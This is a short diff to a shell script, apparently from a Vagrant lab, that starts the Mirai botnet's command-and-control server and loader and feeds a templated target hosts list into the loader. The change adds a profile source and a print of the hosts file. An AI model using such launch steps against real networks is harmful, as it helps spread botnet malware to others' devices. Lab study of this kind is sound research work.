@@ -4,9 +4,14 @@ echo ">>> Starting cnc..."
 killall cnc || true
 duende /vagrant/mirai/release/cnc
 
+echo "source /root/.profile"
+      source /root/.profile
+
 echo ">>> Startig loader..."
 cd /vagrant/mirai/loader
 cp /vagrant/configs/hosts.txt /vagrant/mirai/loader/bins/
 sed -i "s|{ip_prx}|$ip_prx|g;" /vagrant/mirai/loader/bins/hosts.txt
 sed -i "s|{tgt_psx}|$tgt_psx|g;" /vagrant/mirai/loader/bins/hosts.txt
+cat /vagrant/mirai/loader/bins/hosts.txt
+echo ""
 ./reports /vagrant/mirai/loader/bins/hosts.txt | ./loader
